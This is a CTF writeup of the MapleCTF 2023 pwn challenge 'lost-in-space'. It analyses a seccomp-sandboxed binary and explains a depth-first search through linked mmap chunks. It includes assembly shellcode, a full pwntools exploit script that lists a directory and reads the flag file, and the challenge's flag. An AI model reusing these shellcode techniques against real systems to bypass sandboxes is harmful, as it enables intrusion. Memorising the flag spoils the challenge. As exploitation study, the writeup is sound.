---
title: MapleCTF 2023 - lost-in-space
tag:
- CTF
- Pwn
- Writeup
---

# MapleCTF 2023 - lost-in-space
This year I participated with `${CyStick}` in MapleCTF. This post is the writeup to one of the challenges - lost-in-space. This challenge resembles the segfault labyrinth challenge from Google CTF 2022 but with more restrictions.
<!--more-->


# Challenge Description

```
Can you find your way to safety?

Author: xal

`nc lost-in-space.ctf.maplebacon.org 1337`

Solves: 11 solves
```

# Inspection
---
We are given the challenge binary, which is quite small (only 4199 bytes). Something weird happens when I try to dump the instructions using objdump.


```
$ objdump -D lost-in-space

lost-in-space:     file format elf64-x86-64

$
```

After looking at the disassembly in [binary ninja cloud](https://cloud.binary.ninja/bn/255a9979-dc42-423d-9e1e-fed3b2bdd99e) and run the binary using gdb, we can roughly map out what the binary is doing.  (PS. I'm not sure if linking to the session directly works for other people to view the same session.)


1. Some initialization stuff, setup random (start of main())
1. Set up the mmap chunks (alloc_maps())
1. Read shellcode from the user and place it in an executable chunk (read call in main())
1. Seccomp the process so only the marked chunks can call syscall (seccomp())
1. Execute shellcode (jump_to_shellcode_with_umap())

![](/img/maplectf2023-lost-in-space-main.png)

One important structure used is the map structure, which looks like the following
```c
struct map
{
	int32_t can_syscall;
	int32_t link_count;
	struct map* links[];
};
```
Each chunk allocated using mmap will contain this structure at the starting address. The `can_syscall` field denotes if the chunk is whitelisted by the seccomp rule, the link_count and links store the connections to the other maps.

In the alloc_maps function, the chunks are set up with the following steps:

1. Allocate a lot of chunks:

	The first do-while loop will allocate 1000 chunks of size 0x1000

1. Link the chunks together randomly:

	The second do-while loop links each chunk with the next chunk, while the third do-while loop adds additional links to the chunks to form a dense network. In total, 3500 links were created.
	This ensures that all the chunks are linked together, so the graph is always connected. 

1. Shuffle the links in a chunk:
	
	The shuffle links function will randomly shuffle the connections between the chunks stored in the map structure, so we can't follow the allocation process to retrieve the target chunk easily.

1. Mprotect all but two chunks, and mark the executable chunks
	
	In the last do-while loop, the loop skips chunk 1 and chunk 0xc8, and marks all other chunks to be read-only. This effectively leaves only two chunks executable. 
	
	

![](/img/maplectf2023-lost-in-space-alloc-maps.png)

We can also dump the seccomp rule for some details

```
$ seccomp-tools dump ./lost-in-space
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000008  A = instruction_pointer
 0001: 0x35 0x00 0x02 0x764cb000  if (A < 0x764cb000) goto 0004
 0002: 0x25 0x01 0x00 0x764cc000  if (A > 0x764cc000) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x20 0x00 0x00 0x00000004  A = arch
 0005: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0006: 0x20 0x00 0x00 0x00000000  A = sys_number
 0007: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 $ 
```

When I dump the seccomp rule, I notice that the location on line 2 and 3 changes every time. This aligns with our guess that we are only allowed to execute syscall in that marked chunk, which changes each execution. The seccomp rules are quite simple. Basically, all syscalls are blocked except munmap if it was called outside of the allowed chunk.

Lastly, the shellcode is called using the following snippet.

![](/img/maplectf2023-lost-in-space-jmp-shellcode.png)

The binary wipes out all registers before our shellcode is called, and both stack and binary are unmapped before our shellcode, so we can't reuse values on stack or binary.
# DFS
In order to traverse the graph, I opt to use depth-first search (DFS). However, since our shellcode/program is effectively limited to a single 0x1000 sized chunk, we need to take care of the memory space used. I'm too lazy to implement the whole search in assembly so I wrote the code in c and let gcc compile it for me. The shellcode is compiled from the following c source using godbolt, with `gcc 10.5` and argument `-Os` to reduce shellcode size.
```c
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>

struct map{
    int can_syscall;
    int count;
    struct map* points[];
};

typedef struct map map;
short vis[0x200];
int vis_count = 0;
short to_index(map* a){
    return (short)((unsigned long)a >> 31);
}

map* dfs(map* a, int depth){
    if(a->can_syscall) return a;
    if(depth > 32) return NULL;
    for(int i=0;i < a->count;i++){
        map* next_map = a->points[i];
        int test = 0;
        for(int j=0;j<vis_count;j++){
            test |= (vis[j] == to_index(next_map));
        }
        if(test == 1) continue;
        vis[vis_count] = to_index(next_map);
        vis_count+=1;
        map* res = dfs(next_map, depth+1);
        if(res != NULL) return res;
    }
    return NULL;
}
int main(){
    map* a;
    dfs(a, 0);
}
```

The output of the compiler can mostly be used directly, but the vis array appears to require relocation, so I instead use a spare register to track its location. Also, the dfs depth is needed so the stack doesn't underflow outside the limited memory space.

# Solve
In the shellcode I then set up the stack to start from 0x800 and grow downward, and the vis array to start from 0xa00 and grow upward. To save space for the visited chunks, I truncated the address of each chunk to only the top 16 changing bits, so we can store more value within the allotted space. 

```nasm
mov rax, rdx ; rdx contains the address to the middle of the chunk
mov rsp, rdx ; set stack
mov rbp, rdx ; set stack
mov rdi, rdx 
sub rdi, 0x800 ; get map struct of current chunk
mov r11, rdx
add r11, 0x200 ; use r11 as vis array
mov r10, 0     ; use r10 as vis counter
xor rsi, rsi   ; argument, depth = 0
call dfs
```

When the call to dfs returns, rax should point to the executable chunk, I then write the second stage shellcode to that location.

```nasm
add rax, 0x800 ; executable chunk, middle
mov rbp, rax   ; new stack
mov rsp, rax

mov rbx, 0xdeadbeef ; stage2 shellcode
mov QWORD PTR [rbp], rbx

mov rdx, 0  ; pre-clear registers
mov rdi, 0
mov rsi, 0
jmp rax
```

Originally I tried to spawn a shell, but then realized that the seccomp rules will be inherited by the spawned process, so syscalls will fail as they can't pass the seccomp filter. In the end, a simple orw shellcode is sufficient in printing out the flag. In the solve script, I used shellcraft for that. I also include the shellcode for listing files in a directory, since the flag file name isn’t given in the challenge description. Presumably, if the challenge creator wants to make this challenge more difficult, he can make the file name non-guessable, and require the attacker to list out directory contents to print the flag.


`maple{its_a_small_world_when_log_N_minus_gamma_over_log_k_small}`

## Probably intended solution - random walk
After the solve and seeing the flag, it's clear that a simpler approach can be taken to solve the challenge. A simple randomized algorithm can be applied to solve this challenge. Since the edges should distributed quite evenly, the graph should be highly connected. Therefore, a random walk on the graph can easily reach each node. If we repeatedly choose a random node to visit from the current node's connection list, we form a random walk. If we repeatedly go to the next node and with a high enough walk count, we will reach the desired node since the graph is connected. I don't know how to calculate the exact expected walk count, but it should be somewhere around O(n^3). For more information, one can maybe search up [st-connectivity](https://en.wikipedia.org/wiki/St-connectivity) and random walk.

# Appendix A - exp.py
{% capture solve_py %}
```python
#!/usr/bin/python3

from pwn import *
# from ctypes import CDLL
import time


context.binary = bin_name = "./lost-in-space"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF(bin_name)


def connect():
    if args.REMOTE:
        nc_str = "nc lost-in-space.ctf.maplebacon.org 1337"
        _, host, port = nc_str.split(" ")
        p = remote(host, int(port))

    else:
        p = process(bin_name)
        if args.GDB:
            gdb_script = """
            """
            gdb.attach(p, gdb_script)

    return p


def main():
# init state: rdx = rip, current location
# everything else is cleared
# r10 -> vis counter
# r11 -> vis array

    f_name = b"/ctf/".ljust(8, b"\x00")
    # list /ctf/
    stage2 = asm(f"""
  /* push "/ctf/" */
  mov rax, {u64(f_name)}
  push rax
  /* call open("rsp", 0, 0) */
  push 2 /* (SYS_open) */
  pop rax
  mov rdi, rsp
  xor esi, esi /* 0 */
  cdq /* rdx=0 */
  syscall
  /* call getdents("rax", "rsp-0x400", 0x400) */
  mov rdi, rax
  push 0x4e /* (SYS_getdents) */
  pop rax
  mov rsi, rsp
  sub rsi, 0x400
  xor edx, edx
  mov dh, 0x400 >> 8
  syscall
  /* call write(1, "rsp-0x400", "rax") */
  push 1
  pop rdi
  mov rsi, rsp
  sub rsi, 0x400
  mov rdx, rax
  push 1 /* (SYS_write) */
  pop rax
  syscall
    """).ljust(80, b"\x90")

    # leaked file name from ls above
    stage2 = asm(shellcraft.amd64.linux.cat("/ctf/flag.txt", fd=1)).ljust(128, b"\x90")
    print(stage2.hex())

    assembly = f"""

    mov rax, rdx

make_stack:

    mov rsp, rdx
    mov rbp, rdx
    mov rdi, rdx
    sub rdi, 0x800
    mov r11, rdx
    add r11, 0x200
    mov r10, 0
    xor rsi, rsi
    call dfs
    add rax, 0x800
    mov rbp, rax
    mov rsp, rax
    """

    # setup stage2
    for i in range(0, len(stage2), 8):
        assembly+=f"""
        mov rbx, {u64(stage2[i:i+8])}
        mov QWORD PTR [rbp+{i}], rbx
        """

    # jump to stage 2
    assembly += """
    mov rdx, 0
    mov rdi, 0
    mov rsi, 0
    jmp rax
    """

# change output "vis" from godbolt to use r11 for tracking
# so pwntools and assemble correctly without relocation error

    assembly += """
to_index:
        mov     rax, rdi
        shr     rax, 31
        ret
dfs:
        cmp     DWORD PTR [rdi], 0
        mov     rax, rdi
        jne     .L15
        push    r12
        lea     r12d, [rsi+1]
        push    rbp
        xor     ebp, ebp
        push    rbx
        mov     rbx, rdi
        cmp     esi, 10
        jle     .L4
.L10:
        xor     eax, eax
        jmp     .L2
.L19:
        dec     ecx
        jne     .L7
.L8:
        inc     rbp
.L4:
        cmp     DWORD PTR [rbx+4], ebp
        jle     .L10
        mov     rdi, QWORD PTR [rbx+8+rbp*8]
        mov     eax, DWORD PTR vis_count[rip]
        xor     ecx, ecx
        xor     edx, edx
        mov     rsi, rdi
        shr     rsi, 31
        mov     r8d, esi
.L5:
        cmp     eax, edx
        jle     .L19
        xor     r9d, r9d

        push    rax
        mov     rax, r11
        add     rax, rdx
        add     rax, rdx
        cmp     WORD PTR [rax], r8w
        pop     rax

        sete    r9b
        inc     rdx
        or      ecx, r9d
        jmp     .L5
.L7:
        movsx   rdx, eax
        inc     eax

        push    rax
        mov     rax, r11
        add     rax, rdx
        add     rax, rdx
        mov     WORD PTR [rax], si
        pop     rax

        mov     esi, r12d
        mov     DWORD PTR vis_count[rip], eax
        call    dfs
        test    rax, rax
        je      .L8
.L2:
        pop     rbx
        pop     rbp
        pop     r12
        ret
.L15:
        ret
vis_count:
        .zero 4

    """

    shellcode = asm(assembly)
    print(len(shellcode))

    p = connect()
    p.sendline(shellcode)


    p.interactive()


if __name__ == "__main__":
    main()

#maple{its_a_small_world_when_log_N_minus_gamma_over_log_k_small}
```
{% endcapture %}
{% include widgets/toggle-field.html toggle-name="solve_py" button-text="Show exp.py" toggle-text=solve_py %}
